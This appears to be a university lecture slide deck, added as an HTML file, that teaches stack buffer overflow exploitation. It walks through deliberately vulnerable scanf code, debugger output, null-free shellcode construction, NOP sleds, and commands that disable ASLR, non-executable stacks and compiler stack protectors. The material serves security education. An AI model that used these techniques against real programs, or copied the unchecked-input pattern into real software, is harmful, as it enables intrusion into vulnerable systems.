@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>DADA: Buffer Overflows</title>
+  <link rel="stylesheet" href="reveal.js/css/reveal.css">
+  <link rel="stylesheet" href="reveal.js/css/theme/black.css">
+  <link rel="stylesheet" href="dada.css">
+  <!-- Theme used for syntax highlighting of code -->
+  <link rel="stylesheet" href="reveal.js/lib/css/zenburn.css">
+  <!-- Printing and PDF exports -->
+  <script>
+    var link = document.createElement( 'link' );
+    link.rel = 'stylesheet';
+    link.type = 'text/css';
+    link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+    document.getElementsByTagName( 'head' )[0].appendChild( link );
+  </script>
+</head>
+
+<body>
+  <div class="reveal">
+    <div class="slides">
+
+      <section data-markdown id="cover"><script type="text/template">
+# CS 4630
+&nbsp;
+### Defense Against the Dark Arts
+&nbsp;
+<center><small>[Aaron Bloomfield](http://www.cs.virginia.edu/~asb) / [aaron@virginia.edu](mailto:aaron@virginia.edu) / [@bloomfieldaaron](http://twitter.com/bloomfieldaaron)</small></center>
+<center><small>Repository: [github.com/aaronbloomfield/dada](http://github.com/aaronbloomfield/dada) / [&uarr;](index.html) / <a href="?print-pdf"><img class="print" width="20" src="images/print-icon.png"></a></small></center>
+&nbsp;  
+&nbsp;
+## Buffer Overflows
+  </script></section>
+
+	<section data-markdown><textarea data-template>
+# Contents
+&nbsp;  
+[Introduction](#/intro)  
+[How to do it](#/how2doit)  
+[Defenses](#/defenses)  
+	</textarea></section>
+
+	<section>
+      
+	  <section data-markdown id="intro"><textarea data-template>
+# Introduction
+	  </textarea></section>
+	  
+	  <section data-markdown data-separator="^\n$"><textarea data-template>
+## Introduction...
+- Given a fixed size buffer, and an input routine that does not check bounds, you can easily overwrite the buffer
+- But what is overwritten, and what it is overwritten with, is what matters
+
+
+## "Smashing the Stack for Fun and Profit"
+- A document published in 1996 by [Elias Levy](https://en.wikipedia.org/wiki/Elias_Levy)
+- This was the "first high-quality, public, step-by-step introduction to stack buffer overflow vulnerabilities and their exploitation"
+- [Online version](http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf)
+
+
+## Vulnerable code
+Source code: [overflow.c](code/buffer-overflows/overflow.c) ([in HTML](code/buffer-overflows/overflow.c.html))
+```
+void vulnerable() {
+    char buffer[100];
+	
+    /* read string from stdin */
+    scanf("%s", buffer);
+	
+    do_something_with(buffer);
+}
+```
+What if we input a 1000 character string?
+
+
+## Crash Attempt
+- What if we input a 1000 character string?
+```
+$ cat 1000-as.txt
+aaaaaaaaaaaaaaaaaaaaaaaa (1000 a’s total)
+$ ./overflow.exe < 1000-as.txt
+Segmentation fault (core dumped)
+$
+```
+- As a side note, the ASCII for 'a' is 96 decimal
+  - Which is 0x61 hex
+
+
+## Debugger examination
+```
+$ gdb ./overflow.exe
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+...
+Reading symbols from ./overflow.exe...done.
+(gdb) run < 1000-as.txt 
+Starting program: /path/to/overflow.exe < 1000-as.txt
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000004005f8 in vulnerable () at overflow.c:14
+10      }
+(gdb) bt
+#0  0x00000000004005f8 in vulnerable () at overflow.c:14
+#1  0x6161616161616161 in ?? ()
+#2  0x6161616161616161 in ?? ()
+...
+#110 0x6161616161616161 in ?? ()
+#111 0x0000000000000000 in ?? ()
+(gdb) 
+
+```
+
+
+## vulnerable()
+Source from `gcc -S`: [overflow.s](code/buffer-overflows/overflow.s) ([in HTML](code/buffer-overflows/overflow.s.html))
+```
+vulnerable:
+sub   rsp, 120              ; allocate space for buffer
+mov   rsi, rsp              ; arg 2 to scanf() is buffer
+mov   edi, OFFSET FLAT:.LC0 ; arg 1 to scanf() is "%s"
+mov   eax, 0                ; set eax = 0
+call  __isoc99_scanf        ; call scanf()
+mov   rdi, rsp              ; arg 1 to do_s_w() is buffer
+call  do_something_with     ; call "do_s_w"
+add   rsp, 120              ; deallocate stack space
+ret                         ; goodbye!
+```
+
+
+## get vulnerable() ret addr
+From `objdump -d overflow.exe`:
+<pre class="code">
+00000000004005d6 < vulnerable >:
+  4005d6:    48 83 ec 78          sub    $0x78,%rsp
+  4005da:    48 89 e6             mov    %rsp,%rsi
+  4005dd:    bf a4 06 40 00       mov    $0x4006a4,%edi
+  4005e2:    b8 00 00 00 00       mov    $0x0,%eax
+  4005e7:    e8 b4 fe ff ff       callq  4004a0 < __isoc99_scanf@plt >
+  4005ec:    48 89 e7             mov    %rsp,%rdi
+  4005ef:    e8 c2 ff ff ff       callq  4005b6 < do_something_with >
+  4005f4:    48 83 c4 78          add    $0x78,%rsp
+  4005f8:    c3                   retq   
+
+00000000004005f9 < main >:
+  4005f9:    48 83 ec 08          sub    $0x8,%rsp
+  4005fd:    b8 00 00 00 00       mov    $0x0,%eax
+  400602:    e8 cf ff ff ff       callq  4005d6 < vulnerable >
+  <span class='red'>400607</span>:    b8 00 00 00 00       mov    $0x0,%eax
+  40060c:    48 83 c4 08          add    $0x8,%rsp
+  400610:    c3                   retq   
+  400611:    66 2e 0f 1f 84 00 00 nopw   %cs:0x0(%rax,%rax,1)
+  400618:    00 00 00 
+  40061b:    0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)
+</pre>
+
+
+## get vulnerable() ret addr
+- Address is 0x400607
+- In 64-bit assembly, that's 0x0000000000400607
+- In Little Endian, that's 0x0706400000000000
+- Or: 07 06 40 00 00 00 00 00
+
+
+## Stack for vulnerable()
+<!-- .slide: class="max-image-height-500" -->
+Before `scanf()` is called:
+![stack diagram](images/buffer-overflows/overflow-stack-1.png)
+
+
+## Stack for vulnerable()
+<!-- .slide: class="max-image-height-500" -->
+After `scanf()` is called: the buffer hath overflowed:
+![stack diagram](images/buffer-overflows/overflow-stack-2.png)
+
+
+## Stack for vulnerable()
+<!-- .slide: class="max-image-height-500" -->
+The return address (and beyond) has also been overwritten:
+![stack diagram](images/buffer-overflows/overflow-stack-3.png)
+
+
+## vulnerable()
+Source from `gcc -S`: [overflow.s](code/buffer-overflows/overflow.s) ([in HTML](code/buffer-overflows/overflow.s.html))
+```
+vulnerable:
+sub   rsp, 120              ; allocate space for buffer
+mov   rsi, rsp              ; arg 2 to scanf() is buffer
+mov   edi, OFFSET FLAT:.LC0 ; arg 1 to scanf() is "%s"
+mov   eax, 0                ; set eax = 0
+call  __isoc99_scanf        ; call scanf()
+mov   rdi, rsp              ; arg 1 to do_s_w() is buffer
+call  do_something_with     ; call "do_s_w"
+add   rsp, 120              ; deallocate stack space
+ret                         ; goodbye!
+```
+- The `ret` opcode tried to return to 0x6161616161616161, which is not in the memory allocated to the program
+  - But what if it *were* a valid address to return to?
+
+
+## Address of `buffer`
+```
+$ gdb overflow.exe 
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+...
+Reading symbols from overflow.exe...done.
+(gdb) break overflow.c:11
+Breakpoint 1 at 0x4005da: file overflow.c, line 11.
+(gdb) run
+Starting program: /path/to/overflow.exe 
+
+Breakpoint 1, vulnerable () at overflow.c:11
+11          scanf("%s", buffer);
+(gdb) print &buffer
+$1 = (char (*)[100]) 0x7fffffffdc90
+(gdb) 
+```
+- Buffer is at 0x7fffffffdc90 == 0x00007fffffffdc90
+  - Little Endian: 90 dc ff ff ff 7f 00 00
+
+
+## Stack for vulnerable()
+<!-- .slide: class="max-image-height-500" -->
+After a successfull buffer overflow exploit:
+![stack diagram](images/buffer-overflows/return-to-stack.png)
+</textarea></section>
+
+      </section>
+      
+	<section>
+      
+	  <section data-markdown id="how2doit"><textarea data-template>
+# How To Do It
+	  </textarea></section>
+	  
+	  <section data-markdown data-separator="^\n$"><textarea data-template>
+## Constructing the attack
+- [Shellcode](https://en.wikipedia.org/wiki/Shellcode) is a "small piece of code used as the payload in the exploitation of a software vulnerability"
+  - This is the machine code that we will have to write
+- We also have to overwrite the return address
+  - And figure out where the buffer is...
+
+
+## Shellcode challenges
+- Ideal is like virus code: works in any executable
+- No linking (no library functions by name)
+- Probably will exit application afterward, as it can't return normally
+  - (or will have to do a bunch more work to restore original return value)
+
+
+## Recall: virus code
+- From [HW 3: binary tricky jump](../hws/hw3-tricky.html)
+  - The "virus" code you had to insert was:
+```
+      leal string(%rip), %edi
+      pushq $0x4004e0 ; address of puts() in 
+	                  ; target executable
+      retq
+string: 
+      .asciz "You have been infected with a virus!"
+```
+Note that this is in AT&T assembly syntax
+
+
+## Recall: virus code
+- The same code, but converted to Intel syntax:
+```
+section .data
+    string db "You have been infected with a virus!", 0x0a
+section .text
+    lea edi, [string]
+    push 0x4004e0   ; address of puts() in
+	                ; target executable
+    ret
+```
+We'll eventually convert this to shellcode (of a sort)
+
+
+## Convert to machine code
+- An easy way to do this:
+  - Write the (AT&T or Intel syntax) assembly to a test.s file
+  - Compile with:
+	- `nasm -f elf -o test.o test.s` (Intel syntax)
+	- `as -o test.o test.s` (AT&T syntax)
+  - Run `objdump -d a.out`
+- Result:
+```
+   0:   8d 3d 00 00 00 00    lea    0x0, %edi
+   7:   68 e0 04 40 00       push   $0x4004e0
+   c:   c3                   ret
+```
+
+
+## 32-bit machine code
+- 8d 3d 00 00 00 00: `lea 0x0, %edi`
+  - 8d: opcode for leal
+  - 3d: [ModR/M byte](http://wiki.osdev.org/X86-64_Instruction_Encoding#ModR.2FM_and_SIB_bytes) (an instruction extension)
+    - 3c specifies that it's a 32 bit offset to be loaded into %rdi (really %edi)
+  - 00 00 00 00: the 32 bit offset
+- 68 e0 04 40 00: `push  0x4004e0`
+  - 68: opcode for pushing a 32 bit constant
+  - e0 04 40 00: the 32 bit constant to be pushed (in little Endian)
+- c3: `ret`
+
+
+## 64-bit machine code
+- To convert to 64-bit machine code, we have to use the 64-bit version of lea (`leaq`, not `leal`)
+  - But we want to specify the address using the same 32 bits!
+- We provide a [REX prefix](https://xem.github.io/minix86/manual/intel-x86-and-64-manual-vol2/o_b5573232dd8f1481-68.html), which specifies the 64-bit operand size
+- The `leal` instruction becomes a `leaq` by putting byte 0x48 before it:
+  - 48 8d 3d 00 00 00 00
+- The other two instructions stay the same
+
+
+## 64-bit machine code
+- Alternatively, edit test.s (change edi to rdi), and compile with the `-f elf64` flag, then run through `objdump -d`. The result:
+```
+   0:   48 8d 3c 25 00 00 00    lea    0x0,%rdi
+   7:   00 
+   8:   68 e0 04 40 00          pushq  $0x4004e0
+   d:   c3                      retq   
+```
+- This produced different (but basically equivalent) machine code from the last slide
+- Byte 7 (0x00) wrapped from the previous line
+
+
+## 64-bit machine code
+```
+   0:   48 8d 3c 25 00 00 00    lea    0x0,%rdi
+   7:   00 
+   8:   68 e0 04 40 00          pushq  $0x4004e0
+   d:   c3                      retq   
+```
+```
+section .data
+  string db "You have been infected with a virus!", 0x0a
+section .text
+  lea edi, [string]
+  push 0x4004e0   ; address of puts() in 
+                  ; target executable
+  ret
+```
+- But what if we don't know where `puts()` is?
+
+
+## OS system calls from assembly
+- The solution: the `syscall` opcode
+- It requests the OS to handle the system call
+  - The system call number goes into rax
+  - Parameters, if any, go into (in order): rdi, rsi, rdx, r10, r8, and r9
+- See a list of possible system calls for Linux [here](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
+
+
+## Relevant `syscall` calls
+- From [the same link as on the last slide](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
+- sys_write: rax = 1
+  - rdi is the file descriptior (1 for stdout)
+  - rsi is the pointer to the buffer to print
+  - rdx is the size of the buffer
+- sys_exit: rax = 60
+  - rdi is the exit code
+
+
+## Print without puts()
+```
+global mysyscall
+section .data
+  string db "You have been infected with a virus!", 0x0a
+section .text
+  mysyscall:
+        mov eax, 1        ; syscall function (sys_write)
+        mov edi, 1        ; print to stdout
+        lea esi, [string] ; buffer to print
+        mov edx, 37       ; size of buffer
+        syscall
+        ret
+```
+This can be compiled (with `nasm -f elf64`), linked with an appropriate `main()` function, and used to print out the above string.
+
+
+## Print without puts()
+The assembly yields the following machine code
+```
+mov eax, 1        ; syscall function (sys_write)
+mov edi, 1        ; print to stdout
+lea esi, [string] ; buffer to print
+mov edx, 37       ; size of buffer
+syscall
+ret
+```
+```
+   0:   b8 01 00 00 00          mov    $0x1,%eax
+   5:   bf 01 00 00 00          mov    $0x1,%edi
+   a:   8d 34 25 00 00 00 00    lea    0x0,%esi
+  11:   ba 25 00 00 00          mov    $0x25,%edx
+  16:   0f 05                   syscall 
+  18:   c3                      retq   
+```
+Note that nothing is 64-bit (even when compiled with `-f elf64`)
+
+
+## Problem: crashes after `syscall`
+- We need to gracefully exit
+- So we use `syscall` to do so:
+```
+mov eax, 1        ; syscall function (sys_write)
+mov edi, 1        ; print to stdout
+lea esi, [string] ; buffer to print
+mov edx, 37       ; size of buffer
+syscall
+mov eax, 60       ; syscall function (sys_exit)
+xor edi, edi      ; exit value (0)
+syscall
+```
+
+
+## Calling sys_write & sys_exit
+The machine code:
+```
+   0:   b8 01 00 00 00          mov    $0x1,%eax
+   5:   bf 01 00 00 00          mov    $0x1,%edi
+   a:   8d 34 25 00 00 00 00    lea    0x0,%esi
+  11:   ba 25 00 00 00          mov    $0x25,%edx
+  16:   0f 05                   syscall 
+  18:   b8 3c 00 00 00          mov    $0x3c,%eax
+  1d:   31 ff                   xor    %edi,%edi
+  1f:   0f 05                   syscall 
+```
+How do we use this as input to the program?
+
+
+## `scanf()` and %s
+- The %s specificer used in scanf() "matches a sequence of non-white-space characters"
+- Thus, we can’t use:
+  - (space)
+  - \t (tab)
+  - \v (vertical tab)
+  - \r (carriage return)
+  - \n (newline)
+- Those aren't really that much of a restriction
+- But what about \0 (hex 0x00)?
+  - We use a lot of these...
+
+
+## Shellcode without 0x00
+- To remove these values we:
+  - Use smaller reigster 'parts' to eliminate extra 0x00's
+	- We may have to zero out the register first
+  - Use relative offsets (especially negative) instead of absolute addresses (which are likely to have 0x00 in it)
+    - See [here](https://www.tortall.net/projects/yasm/manual/html/nasm-effaddr.html) for how to do this in nasm
+  - Remove the trailing '\n' from the string
+
+
+## Shellcode without 0x00
+```
+section .text
+mysyscall:
+	jmp afterString
+string:
+	db "You have been infected with a virus!"
+afterString:	
+	xor eax, eax
+	mov al, 1
+	mov edi, eax
+	lea esi, [rel string]
+	xor edx, edx
+	mov dl, 36
+	syscall
+	mov al, 60
+	xor edi, edi
+	syscall
+```
+
+
+## Shellcode without 0x00
+The assembly on the previous slide results in:
+```
+  26:   31 c0                   xor    %eax,%eax
+  28:   b0 01                   mov    $0x1,%al
+  2a:   89 c7                   mov    %eax,%edi
+  2c:   8d 35 d0 ff ff ff       lea    -0x30(%rip),%esi
+  32:   31 d2                   xor    %edx,%edx
+  34:   b2 24                   mov    $0x24,%dl
+  36:   0f 05                   syscall 
+  38:   b0 3c                   mov    $0x3c,%al
+  3a:   31 ff                   xor    %edi,%edi
+  3c:   0f 05                   syscall 
+```
+Note that the `lea` loads an negative offset, which has no 0x00 bytes
+
+
+## Determining the return address
+- Now that we have the shellcode, we need to determine the return address of the buffer
+- How to do so?
+
+
+## Determining the return address
+- Run program through the debugger
+  - We did this a dozen slides ago
+  - This may not be possible, though, as you may not have the program available
+- Examine target executable disassembly
+  - Figure out how much is allocated on the stack below it, and you may know the stack start location to set return address
+- Guess: location of return address and address of maachine code
+
+
+## Guess?
+- Yes -- you may not be able to determine for sure
+- We can make our shellcode easier for 'guessing'
+- Normal shell code:
+```
+	xor eax, eax
+	mov al, 1
+	... (rest of shellcode)
+```
+- More 'guessable' shellcode starts with many nops:
+```
+	nop
+	nop
+	... (fill the buffer with nops)
+	nop
+	xor eax, eax
+	mov al, 1
+	... (rest of shellcode)
+```
+</textarea></section>
+
+      </section>
+      
+	<section>
+      
+	  <section data-markdown id="defenses"><textarea data-template>
+# Defenses
+	  </textarea></section>
+	  
+	  <section data-markdown data-separator="^\n$"><textarea data-template>
+## But none of this works for me!
+- Yes, because all modern operating systems have defenses against this
+- They had to be turned off for any of this to work
+
+
+## [Address space layout randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization) (ASLR)
+- Basically, the address of the stack starts at a different random location every time a program is run
+  - So in 32-bit, it doesn't always start at 0xffffffff and grow down; it might start at 0xffff1348
+- This applies to the executable, heap, stack, etc.
+- Thus, the address of a buffer will be different every time!
+- Disable with the `-R` flag to `setarch`
+  - More on this in a bit
+
+
+## No execution on the stack
+- Modern hardware (and OSes) will not allow execution of code on the stack
+- The computer has to switch over to 'legacy' virtual memory mode that doesn't have this feature
+- Disable with the `-L` flag to `setarch`
+  - More on this in a bit
+
+
+## setarch
+- To disable the two previous OS protections, you run:
+```
+setarch -v -LR bash
+```
+- You can run any program, but `bash` is the shell, and you don't have to run the `setarch` command each time you want to run a program
+- Recall that `-R` disables ASLR, and `-L` allows execution on the stack
+
+
+## Compiler protection
+- Compilers include code to check if the stack has been smashed
+  - More on this in the [next slide set](15-exploits.html#/)
+- To disable this, use the `-fno-stack-protector` flag when compiling
+	</textarea></section>
+
+      </section>
+      
+    </div>
+  </div>
+  <script src="reveal.js/lib/js/head.min.js"></script> 
+  <script src="reveal.js/js/reveal.js"></script>
+  <script src="settings.js"></script> 
+</body>
+</html>
